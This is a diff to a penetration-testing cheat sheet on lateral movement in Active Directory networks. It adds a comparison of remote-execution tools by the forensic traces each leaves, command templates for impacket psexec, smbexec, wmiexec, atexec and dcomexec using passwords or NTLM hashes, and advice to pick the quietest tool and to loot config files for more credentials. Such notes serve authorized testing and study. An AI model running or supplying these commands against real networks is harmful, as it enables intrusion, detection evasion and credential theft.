@@ -9,13 +9,17 @@ Movement between Windows hosts in an AD environment. Three concerns:
 
 ### Remote Execution Options
 
-| Tool | Auth | Shell type | Default port |
-|------|------|------------|--------------|
-| `evil-winrm` | password / NTLM / Kerberos | Full PowerShell | 5985 / 5986 |
-| `impacket-psexec` | password / NTLM | Interactive, SYSTEM | 445 |
-| `impacket-wmiexec` | password / NTLM | Semi-interactive, user | 135 + dyn |
-| `impacket-smbexec` | password / NTLM | Non-interactive cmd | 445 |
-| `xfreerdp` | password / NLA | GUI | 3389 |
+| Tool | Auth | Shell type | Port | Artifacts |
+|------|------|------------|------|-----------|
+| `evil-winrm` | password / NTLM / Kerberos | Full PowerShell | 5985 / 5986 | Minimal (WinRM logs) |
+| `impacket-psexec` | password / NTLM | Interactive, SYSTEM | 445 | **Loud** — service created, binary uploaded |
+| `impacket-smbexec` | password / NTLM | Non-interactive cmd | 445 | **Loud** — service created |
+| `impacket-wmiexec` | password / NTLM | Semi-interactive, user | 135 + dyn | Minimal |
+| `impacket-atexec` | password / NTLM | Non-interactive, task output | 445 | Scheduled task on disk |
+| `impacket-dcomexec` | password / NTLM | Semi-interactive, user | 135 + dyn | Minimal — uses DCOM objects (MMC20 / ShellWindows) |
+| `xfreerdp` | password / NLA | GUI | 3389 | Interactive logon events |
+
+> You do **not** need WinRM / RDP to exploit an account. If SMB is open and the creds authenticate, one of `psexec / smbexec / wmiexec / atexec / dcomexec` will land a shell — pick the quietest one that works for your objective. Same idea applies to pulling files: SMB + `smbclient` / `nxc smb --spider_plus` is often all you need to loot a config with the next set of creds inside.
 
 #### evil-winrm
 
@@ -34,12 +38,21 @@ download /target/path /path/local
 invoke-binary /opt/binaries/SharpHound.exe
 ```
 
-#### impacket-psexec
+#### impacket-psexec / smbexec / wmiexec / atexec / dcomexec
+
+Same auth flags across all five — swap the binary based on what artifact profile you can accept.
 
 ```bash
 impacket-psexec <DOMAIN>/<user>@<ip> -hashes :<NTLM>
 impacket-psexec <DOMAIN>/<user>:'<pass>'@<ip>
+
+impacket-smbexec   <DOMAIN>/<user>:'<pass>'@<ip>
+impacket-wmiexec   <DOMAIN>/<user>:'<pass>'@<ip>
+impacket-atexec    <DOMAIN>/<user>:'<pass>'@<ip> whoami
+impacket-dcomexec  <DOMAIN>/<user>:'<pass>'@<ip>
 ```
+
+**Pick order (quiet → loud):** `dcomexec` / `wmiexec` → `atexec` → `smbexec` → `psexec`. Start quiet, escalate only if the target refuses (DCOM often blocked by host firewall; WMI blocked less often).
 
 #### xfreerdp (with clipboard + drive sharing — easiest Windows file transfer)
 
